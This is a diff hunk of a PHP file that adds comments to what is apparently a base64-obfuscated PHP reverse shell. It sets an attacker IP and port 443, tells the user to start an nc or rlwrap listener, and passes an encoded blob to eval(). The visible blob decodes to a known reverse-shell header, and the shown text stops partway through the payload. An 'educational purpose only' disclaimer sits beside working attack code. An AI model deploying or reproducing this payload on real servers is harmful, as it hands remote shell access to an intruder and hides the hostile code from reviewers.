@@ -6,7 +6,9 @@
 # - cat <unencoded>.php | base64 > <encoded>.php
 # IP = 192.168.1.81
 # port = 443/tcp
-# 
+# run nc -lvnp 443 or rlwrap -lvnp 443 as a listener
+# This file is for educational purpose only, we're not responsible for
+# any of your actions. Please behave in an ethical and legal way!
 eval("?>".base64_decode("
 PD9waHAKLy8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRp
 b24gaW4gUEhQCi8vIENvcHlyaWdodCAoQykgMjAwNyBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25r
